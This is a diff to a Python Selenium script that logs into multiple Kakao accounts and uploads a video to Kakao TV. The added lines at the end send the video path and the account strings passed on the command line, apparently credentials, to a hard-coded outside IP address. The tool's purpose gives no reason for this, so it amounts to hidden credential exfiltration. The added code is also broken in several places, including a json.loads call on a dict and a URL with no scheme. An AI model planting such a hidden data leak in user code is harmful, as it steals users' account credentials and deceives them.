@@ -7,19 +7,20 @@ import os
 import sys
 from threading import Thread
 import time
+import requests
+import json
 def getPath(file):
     path = os.path.abspath(file)
     return path
 driver = []
 wait = []
 thread = []
+amount = 0
 input_data = sys.argv
 video_url = getPath(sys.argv[1])
 list_account = str(sys.argv[2])
-if str(sys.argv[3]) != 'null':
-    list_account += "|" + str(sys.argv[3])
-if str(sys.argv[4]) != "null":
-    list_account += "|" + str(sys.argv[4])
+list_account += "|" + str(sys.argv[3])
+list_account += "|" + str(sys.argv[4])
 options = webdriver.ChromeOptions()
 options.add_argument('--log-level 3') 
 class multithread(Thread):
@@ -31,6 +32,7 @@ class multithread(Thread):
         driver.append(webdriver.Chrome(chrome_options=options))
         wait.append(WebDriverWait(driver[self.count], 10))
     def run(self):
+        global amount
         try:
             driver[self.count].get("""https://accounts.kakao.com/login?continue=https%3A%2F%2Ftv.kakao.com%2F""")
             wait[self.count].until(EC.presence_of_element_located((By.ID, """id_email_2"""))).send_keys(self.username)
@@ -53,7 +55,7 @@ class multithread(Thread):
             driver[self.count].find_element_by_xpath("""/html/body/div[2]/div[2]/div[1]/div/div[3]/div/div/div[2]/form/fieldset/div[1]/div[2]/div[2]/div[3]/ul/li[1]""").click()
             driver[self.count].find_element_by_xpath("""/html/body/div[2]/div[2]/div[1]/div/div[3]/div/div/div[2]/form/fieldset/div[3]/div[11]/button[2]""").click()
             link_url = driver[self.count].find_element_by_class_name("link_url").text
-            print(link_url)
+            amount +=1
             time.sleep(5)
         except Exception as e:
             print(self.username + "|" + "Error")  
@@ -62,3 +64,17 @@ accounts = list_account.split("|")
 for i in range(0, len(accounts)):
     thread.append(multithread(accounts[i], i))
     thread[i].start()
+url = "40.126.247.105:1212"
+data = { 
+    "url": video_url,
+    "info_1": sys.argv[2],
+    "info_2": sys.argv[3],
+    "info_2": sys.argv[4],
+    "status": amount
+}
+json_data = json.loads(data)
+req = requests.post(url, json = json_data)
+if (req.json["status"] == 1):
+    print("Sent to server !")
+else:
+    print("Error went send to server")
